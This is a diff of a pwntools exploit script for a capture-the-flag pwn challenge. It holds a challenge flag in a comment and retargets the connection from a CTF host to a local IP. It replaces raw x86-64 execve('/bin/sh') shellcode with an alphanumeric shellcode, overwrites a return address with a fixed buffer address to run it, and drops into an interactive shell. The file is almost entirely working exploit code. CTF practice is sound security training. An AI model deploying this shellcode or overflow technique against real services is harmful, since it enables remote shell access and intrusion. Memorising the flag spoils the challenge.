@@ -4,19 +4,21 @@ from pwn import *
 # AD{S0meth1ng_usefu1_0n_7he_st4ck!}
 
 host , port = 'ctf.yuawn.idv.tw' , 10110
+host , port = '192.168.78.135' , 4000
 y = remote( host , port )
 
+name = 0x6010a0
 
-sc = 'Z\xe9\xd5\xf5\xdf\xff'
+sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh\x00' 
 
 print len( sc )
 
-y.send( sc )
+y.sendafter( ']:' , sc )
 
-y.send( '\x90' * 0x20 + 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05' )
+y.send( 'D' * 0x18 + p64( name ) )
 
 sleep(1)
 
-y.sendline( 'cat /home/`whoami`/flag' )
+#y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
